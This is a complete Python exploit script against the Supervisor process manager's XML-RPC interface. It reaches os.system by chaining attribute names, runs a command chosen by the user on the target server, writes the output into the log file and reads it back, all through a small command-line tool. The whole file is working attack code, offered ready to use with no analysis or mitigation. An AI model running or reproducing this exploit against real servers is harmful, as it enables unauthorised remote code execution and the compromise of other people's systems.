import xmlrpc.client
import requests
import requests.packages.urllib3
requests.packages.urllib3.disable_warnings()

import click

def exp(target, command):
    with xmlrpc.client.ServerProxy(target) as proxy:
        old = getattr(proxy, 'supervisor.readLog')(0,0)
        logfile = getattr(proxy, 'supervisor.supervisord.options.logfile.strip')()
        getattr(proxy, 'supervisor.supervisord.options.warnings.linecache.os.system')('{} | tee -a {}'.format(command, logfile))
        result = getattr(proxy, 'supervisor.readLog')(0,0)
    print("Execute successfully,result:\n" + result[len(old):])

@click.command()
@click.option("-i", help='Target ip', type=str)
@click.option("-p", help='Target port', type=str)
@click.option("-c", help="Commands to be executed; ", type=str)
def main(i, p,c):
    res = requests.get('http://'+i+':'+p,verify=False)
    if res.status_code==200:
        url = 'http://'+i+':'+p
    else:url='https://'+i+':'+p

    target = str(url) + "/RPC2"
    exp(target, c)

if __name__ == "__main__":
    main()




